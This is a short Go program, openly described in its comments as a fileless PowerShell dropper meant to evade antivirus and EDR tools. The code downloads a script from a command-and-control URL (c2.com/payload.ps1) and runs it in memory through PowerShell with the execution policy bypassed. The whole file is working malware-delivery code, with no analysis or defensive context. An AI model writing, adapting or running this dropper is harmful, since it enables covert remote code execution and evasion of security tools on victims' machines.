// A fileless PowerShell dropper does not write any payload to disk. Instead,
// it loads and executes code directly in memory using PowerShell. This technique
// is often used to evade antivirus and EDR solutions, which typically monitor disk
// writes and executable launches.

package main

import (
	"fmt"
	"io"
	"net/http"
	"os/exec"
)

func main() {
	url := "http://c2.com/payload.ps1"

	fmt.Println("[*] Fetching PowerShell payload...")
	psScript, err := fetchPayload(url)
	if err != nil {
		fmt.Printf("[-] Failed to fetch payload: %v\n", err)
		return
	}

	fmt.Println("[*] Executing PowerShell payload in memory...")
	err = executePowerShell(psScript)
	if err != nil {
		fmt.Printf("[-] Execution failed: %v\n", err)
		return
	}

	fmt.Println("[+] Payload executed in memory.")
}

func fetchPayload(url string) (string, error) {
	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(data), nil
}

func executePowerShell(script string) error {
	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script)
	return cmd.Run()
}
